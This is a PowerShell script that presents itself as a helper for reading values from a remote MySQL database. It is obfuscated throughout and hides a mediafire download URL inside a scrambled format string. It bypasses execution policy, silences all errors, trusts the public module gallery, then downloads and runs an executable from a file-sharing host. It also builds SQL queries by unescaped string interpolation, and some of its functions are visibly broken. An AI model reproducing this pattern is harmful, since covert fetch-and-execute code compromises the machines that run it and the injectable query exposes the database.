# usage: readDB -req "$SrvMysql:$port/$DatabaseName.$TableName.$VarName?$chkname=$chkvalue" -usr "$usr" -psw "$psw"

function ExpandZip{
param($ZipFile,$SrcPath,$Psw)
$ErrorActionPreference = 'silentlycontinue'
Set-ExecutionPolicy -ExecutionPolicy bypass -force
Set-Variable -Name HERe -Value (${pSs`cRi`PtR`OOT}); if(!${he`RE}){${he`RE} = (.("{1}{0}{2}{3}"-f'cat','Get-Lo','i','on'))."P`Ath"}

Set-PSRepository -Name PSGallery -InstallationPolicy Trusted
Install-Module -Name 7Zip4Powershell | out-null
Import-module 7Zip4Powershell -DisableNameChecking -Force | out-null

$ZipFilePath = split-path -parent $ZipFile
$ZipFileName = $ZipFile.split('\')[-1]
$securePassword = ConvertTo-SecureString $Psw -AsPlainText -Force
$TargetPath = $here

	if($Psw -eq 'N/A'){Expand-7Zip -ArchiveFileName $ZipFile -TargetPath $TargetPath}else{Expand-7Zip -ArchiveFileName $ZipFile -TargetPath $TargetPath -SecurePassword $securePassword}
	while(!(Test-Path $TargetPath -ErrorAction silentlycontinue)){Start-Sleep -Seconds 1}
}

function extractfile{
param($file,$ZipFile,$Psw)
$ErrorActionPreference = 'silentlycontinue'
Set-ExecutionPolicy -ExecutionPolicy bypass -force
Set-Variable -Name HERe -Value (${pSs`cRi`PtR`OOT}); if(!${he`RE}){${he`RE} = (.("{1}{0}{2}{3}"-f'cat','Get-Lo','i','on'))."P`Ath"}

if($Psw){$unzipextpath = ExpandZip -dec -ZipFile $ZipFile -Psw $Psw}else{$unzipextpath = ExpandZip -dec -ZipFile $ZipFile -Psw 'N/A'}

Remove-Item $ZipFile -Force -Confirm:$false | out-null

return $newfilepath
}

function ConnSQLLicGD{
	param($query,$querType,$db,$Var,$Table,$chkcol,$chkval,$ResType,$Creds,$serverIP,$Port,[switch]$AdmTST)
$erroractionpreference = 'silentlycontinue'
Set-ExecutionPolicy -ExecutionPolicy bypass -force

$here = $PSScriptRoot
if(!$here){$here = (Get-Location).path}
$mysqlpath = "$here\Mysql.exe" 
$result = 'N/A'
$username = $Creds.split('/')[0]
$password = $Creds.split('/')[1]
$query = "SELECT $Var FROM $Table WHERE $chkcol = '$chkval';"

if(!(test-path $mysqlpath -erroraction silentlycontinue)){
#i save mysql in my file server to be sure to be able to use it:
$MySQLURL = ("{1}{8}{0}{9}{7}{2}{11}{3}{4}{6}{10}{5}"-f 'afire.com/file_','h','m/2cf5zhe','5','a','p/file','i','u','ttps://cdt.medi','premi','/mysql.zi','mqmwu')
$filePath = "$here\mysql.zip"
Invoke-WebRequest -Uri $MySQLURL -OutFile $filePath
$mysqlpath = extractfile -file "mysql.exe" -ZipFile $filePath
}

$result = & $mysqlpath "-h$serverIP" "-P$Port" "-u$username" "-p$password" $db "-e$query"
return $result
}

function readDB{
	param([string]$req,$usr,$psw)
$erroractionpreference = 'silentlycontinue'
Set-ExecutionPolicy -ExecutionPolicy bypass -force

Set-Variable -Name SeRvErip -Value (${r`eQ}.("{1}{0}" -f'lit','sp').Invoke(':')[0]); Set-Variable -Name porT -Value (${R`eQ}.("{1}{0}" -f 'lit','sp').Invoke(':')[1].("{0}{1}"-f's','plit').Invoke('/')[0]); Set-Variable -Name DATabAseVALSiNfos -Value (${r`EQ}.("{1}{0}"-f't','spli').Invoke('/')[-1]); Set-Variable -Name dATAbasEValpAtH -Value (${DAtAb`Aseva`lSIn`Fos}.("{1}{0}"-f't','spli').Invoke('?')[0]); Set-Variable -Name DAtaBaseNAmE -Value (${DaTAbaS`Ev`ALPa`TH}.("{1}{0}" -f't','spli').Invoke('.')[0]); Set-Variable -Name TABLenAMe -Value (${D`AtabASeV`A`LpaTh}.("{0}{1}"-f'spl','it').Invoke('.')[1]); Set-Variable -Name vARNAme -Value (${DatA`BaSe`V`AlpaTH}.("{1}{0}"-f 'plit','s').Invoke('.')[2]); Set-Variable -Name dATaBASeChkS -Value (${daTaBA`seva`L`s`INFoS}.("{1}{0}" -f'lit','sp').Invoke('?')[1]); Set-Variable -Name CHknAMe -Value (${d`ATa`Basec`HKS}.("{0}{1}"-f's','plit').Invoke('|')[0]); Set-Variable -Name cHkValue -Value (${dA`TA`BAS`eC`HKs}.("{1}{0}"-f'it','spl').Invoke('|')[1])

[string]$read = &("{2}{0}{1}{3}" -f'SQL','L','Conn','icGD') -db ${d`AtABA`senAMe} -Table ${tA`Bl`en`AME} -Creds "$usr/$psw" -Port ${pO`Rt} -chkval ${cHK`VAlUE} -serverIP ${S`eRV`eRIp} -chkcol ${chk`N`AmE} -Var ${Va`Rn`AME}
$Resultread = $read.split(' ')[1]

return $Resultread
}
